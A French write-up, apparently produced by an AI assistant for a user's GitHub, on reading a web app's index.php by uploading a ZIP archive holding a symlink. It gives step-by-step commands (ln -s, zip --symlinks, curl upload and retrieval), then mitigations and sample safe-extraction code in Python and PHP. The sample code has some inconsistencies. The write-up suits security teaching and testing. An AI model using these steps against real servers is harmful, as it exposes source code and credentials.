


# 🗜️ Exploitation d'un upload ZIP via lien symbolique

> **Auteur :** [@spectramz](https://github.com/exploit4040) — *"Le roi des pirates"* 🏴‍☠️
> **Catégorie :** Web Exploitation
> **Difficulté :** ⭐⭐☆☆☆
> **Tags :** `zip`, `symlink`, `file-upload`, `path-traversal`, `lfi`

---

## 📌 Table des matières

- [Contexte](#-contexte)
- [Description de la vulnérabilité](#-description-de-la-vulnérabilité)
- [Exploitation pas à pas](#-exploitation-pas-à-pas)
- [Schéma de l'attaque](#-schéma-de-lattaque)
- [Recommandations de sécurité](#-recommandations-de-sécurité)
- [Références](#-références)
- [À propos de l'auteur](#-à-propos-de-lauteur)

---

## 🎯 Contexte

Une application web permet à ses utilisateurs de téléverser des **archives ZIP** qui sont automatiquement **décompressées** dans un répertoire accessible publiquement. L'application affiche ensuite la liste des fichiers extraits et permet de les consulter individuellement.

**Objectif :** lire le contenu du fichier `index.php` situé à la racine de l'application, qui contient le mot de passe de validation.

---

## 🕳️ Description de la vulnérabilité

L'application **ne vérifie pas le contenu de l'archive** avant de l'extraire. Elle se contente de valider :

- L'extension du fichier (`.zip`)
- La taille maximale
- Le type MIME (parfois)

Aucun contrôle n'est effectué sur :

- Les **chemins internes** des fichiers (`../`, `/etc/passwd`…)
- Les **liens symboliques** (symlinks)
- Les **fichiers cachés** (`.htaccess`, `.env`…)

L'attaquant peut donc inclure un **lien symbolique** dans son archive ZIP. Lors de la décompression, le serveur crée un fichier qui pointe vers un fichier arbitraire du système. La lecture de ce fichier via le navigateur affiche alors le contenu de la cible.

> 💡 **Rappel :** un lien symbolique (symlink) est un fichier spécial qui agit comme un raccourci vers un autre fichier. Il est transparent pour la plupart des opérations (lecture, écriture…).

---

## 🛠️ Exploitation pas à pas

### Étape 1 — Créer un lien symbolique vers le fichier cible

On crée un lien symbolique nommé `index.txt` qui pointe vers `index.php`.

Le chemin relatif doit être ajusté en fonction de la **profondeur du répertoire d'extraction**. Dans notre cas, on remonte de 3 niveaux (`../../../`) pour atteindre la racine de l'application.

```bash
ln -s ../../../index.php index.txt
```

**Vérification :**

```bash
ls -la index.txt
# lrwxrwxrwx 1 user user 15 ... index.txt -> ../../../index.php
```

> ⚠️ Si le chemin ne fonctionne pas, ajuste le nombre de `../` :
> - `../index.php` (1 niveau)
> - `../../index.php` (2 niveaux)
> - `../../../index.php` (3 niveaux) ← cas fréquent
> - `../../../../index.php` (4 niveaux)

---

### Étape 2 — Compresser le lien symbolique

L'option `--symlinks` (ou `-y`) est **essentielle** : elle force `zip` à conserver le lien symbolique tel quel, au lieu de copier le contenu du fichier cible dans l'archive.

```bash
zip --symlinks index.zip index.txt
```

**Sortie attendue :**

```
  adding: index.txt (stored 0%)
```

**Vérification du contenu de l'archive :**

```bash
unzip -l index.zip
# Archive:  index.zip
#   Length      Date    Time    Name
# ---------  ---------- -----   ----
#         0  2026-10-02 12:00   index.txt
# ---------                     -------
#         0                     1 file
```

---

### Étape 3 — Téléverser l'archive

On envoie le fichier `index.zip` via le formulaire d'upload de l'application.

**Avec `curl` :**

```bash
curl -X POST http://<CIBLE>/upload \
     -F "file=@index.zip" \
     -c cookies.txt -b cookies.txt
```

**Via l'interface web :**

1. Cliquer sur « Choisir un fichier »
2. Sélectionner `index.zip`
3. Cliquer sur « Upload »

---

### Étape 4 — Accéder au fichier extrait

Une fois l'upload terminé, le serveur renvoie un lien vers le répertoire d'extraction, par exemple :

```
http://<CIBLE>/tmp/upload/<id_unique>/index.txt
```

**Structure typique :**

```
/tmp/upload/
└── 5df34708c52f26.40562607/
    └── index.txt → ../../../index.php
```

En cliquant sur le lien `index.txt`, le serveur suit le lien symbolique et affiche le contenu de `index.php`.

**Récupération via `curl` :**

```bash
curl http://<CIBLE>/tmp/upload/<id_unique>/index.txt
```

---

## 🏁 Résultat

Le code source de `index.php` est affiché en clair. Il contient généralement :

- Le mot de passe de validation
- Des identifiants de connexion
- Des clés d'API
- La logique interne de l'application

**Exemple de sortie :**

```php
<?php
// Configuration de l'application
$admin_password = "N3v3r_7rU5T_u5Er_1npU7";

// ... suite du code
?>
```

Le mot de passe de validation est extrait et peut être soumis.

---

## 🎨 Schéma de l'attaque

```
┌─────────────────────────────────────────────────────────────┐
│  1. Création du lien symbolique                             │
│     $ ln -s ../../../index.php index.txt                    │
│     index.txt ──────────────► index.php                     │
└─────────────────────────────────────────────────────────────┘
                            │
                            ▼
┌─────────────────────────────────────────────────────────────┐
│  2. Compression avec préservation du symlink                │
│     $ zip --symlinks index.zip index.txt                    │
│     index.zip contient : [index.txt] → ../../../index.php  │
└─────────────────────────────────────────────────────────────┘
                            │
                            ▼
┌─────────────────────────────────────────────────────────────┐
│  3. Upload vers le serveur cible                            │
│     POST /upload  (multipart/form-data)                     │
│     Body : index.zip                                        │
└─────────────────────────────────────────────────────────────┘
                            │
                            ▼
┌─────────────────────────────────────────────────────────────┐
│  4. Extraction côté serveur                                 │
│     /var/www/uploads/<id>/index.txt                         │
│         └── lien symbolique vers /var/www/index.php         │
└─────────────────────────────────────────────────────────────┘
                            │
                            ▼
┌─────────────────────────────────────────────────────────────┐
│  5. Lecture via le navigateur                               │
│     GET /uploads/<id>/index.txt                             │
│     → Le serveur suit le symlink et affiche index.php       │
└─────────────────────────────────────────────────────────────┘
```

---

## 🛡️ Recommandations de sécurité

### Pour les développeurs

| Priorité | Mesure |
|----------|--------|
| 🔴 **Critique** | Ne **jamais** décompresser d'archives fournies par des utilisateurs sans validation préalable |
| 🔴 **Critique** | Rejeter les **liens symboliques** dans les archives (vérification `stat()` avant extraction) |
| 🟠 **Haute** | Valider les chemins internes : refuser `../`, chemins absolus, caractères nuls |
| 🟠 **Haute** | Extraire les fichiers dans un **répertoire isolé** avec des permissions minimales |
| 🟡 **Moyenne** | Utiliser une **liste blanche** de types de fichiers autorisés |
| 🟡 **Moyenne** | Limiter la taille des archives (protection DoS / zip bomb) |
| 🟢 **Faible** | Journaliser les uploads et les extractions |

### Exemple de code sécurisé (Python)

```python
import zipfile
import os
import tempfile

def safe_extract(zip_path, extract_dir):
    with zipfile.ZipFile(zip_path, 'r') as z:
        for info in z.infolist():
            # Rejeter les symlinks
            if (info.external_attr >> 16) & 0o170000 == 0o120000:
                raise ValueError(f"Symlink détecté : {info.filename}")
            
            # Rejeter les chemins absolus et les ../
            filename = os.path.basename(info.filename)
            if '..' in info.filename or info.filename.startswith('/'):
                raise ValueError(f"Chemin invalide : {info.filename}")
            
            # Extraction sécurisée
            target_path = os.path.join(extract_dir, filename)
            if not os.path.abspath(target_path).startswith(os.path.abspath(extract_dir)):
                raise ValueError(f"Path traversal détecté : {info.filename}")
            
            z.extract(info, extract_dir)
```

### Exemple de code sécurisé (PHP)

```php
<?php
function safeExtract($zipPath, $destDir) {
    $zip = new ZipArchive();
    if ($zip->open($zipPath) !== true) {
        throw new Exception("Impossible d'ouvrir l'archive");
    }
    
    for ($i = 0; $i < $zip->numFiles; $i++) {
        $stat = $zip->statIndex($i);
        $name = $stat['name'];
        
        // Bloquer les symlinks
        $externalAttrs = ($stat['external_attributes'] ?? 0) >> 16;
        if (($externalAttrs & 0170000) === 0120000) {
            throw new Exception("Symlink détecté : $name");
        }
        
        // Bloquer les chemins dangereux
        if (strpos($name, '..') !== false || strpos($name, '/') === 0) {
            throw new Exception("Chemin invalide : $name");
        }
        
        // Extraire individuellement
        $dest = realpath($destDir) . '/' . basename($name);
        if (strpos(realpath(dirname($dest)), realpath($destDir)) !== 0) {
            throw new Exception("Path traversal : $name");
        }
        
        $zip->extractTo($destDir, $name);
    }
    
    $zip->close();
}
?>
```

---

## 📚 Références

- [CWE-59: Improper Link Resolution Before File Access](https://cwe.mitre.org/data/definitions/59.html)
- [CWE-434: Unrestricted Upload of File with Dangerous Type](https://cwe.mitre.org/data/definitions/434.html)
- [CWE-22: Improper Limitation of a Pathname to a Restricted Directory](https://cwe.mitre.org/data/definitions/22.html)
- [OWASP: Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
- [Zip Symlink Attack — Wikipedia](https://en.wikipedia.org/wiki/Symlink_attack)
- [Zip Slip Vulnerability — Snyk](https://snyk.io/research/zip-slip-vulnerability)

---

## 🏴‍☠️ À propos de l'auteur

**SpectraMz** — Passionné de cybersécurité offensive, bug bounty hunter et rédacteur de write-ups.

- 🐙 GitHub : [@exploit4040](https://github.com/exploit4040)
- 🎯 Spécialités : Web Exploitation, Pentest, Red Team
- 📝 Blog : *à venir*

> *"Le roi des pirates, c'est celui qui comprend la mer avant de la naviguer."* 🏴‍☠️

---

## 📄 Licence

Ce write-up est publié sous licence **MIT**. Vous êtes libre de le partager, l'adapter et le réutiliser, à condition de créditer l'auteur original.

---

<p align="center">
  <b>⭐ Si ce write-up t'a aidé, mets une étoile sur le repo ! ⭐</b>
</p>
```

---

## 💡 Conseils de publication

1. **Nom du fichier** : garde `zip_vul.md` (simple et clair) ou renomme en `writeup-zip-symlink.md`.
2. **Description du repo** : 
   > « Write-ups et cheatsheets en cybersécurité offensive — Web Exploitation, Pentest, Red Team. »
3. **Topics GitHub** : `cybersecurity`, `writeup`, `web-exploitation`, `zip`, `symlink`, `pentest`, `infosec`, `ctf`
4. **Licence** : ajoute un fichier `LICENSE` (MIT) à la racine du repo.
5. **README principal** : crée un `README.md` à la racine qui liste tous tes write-ups avec des liens vers chaque fichier.

---

Bien joué pour ce challenge, et bonne publication sur ton GitHub ! Si tu veux que je te génère un **README principal** qui regroupe tous tes write-ups (avec un sommaire, des catégories, des stats…), dis-moi et je te le prépare. 🏴‍☠️
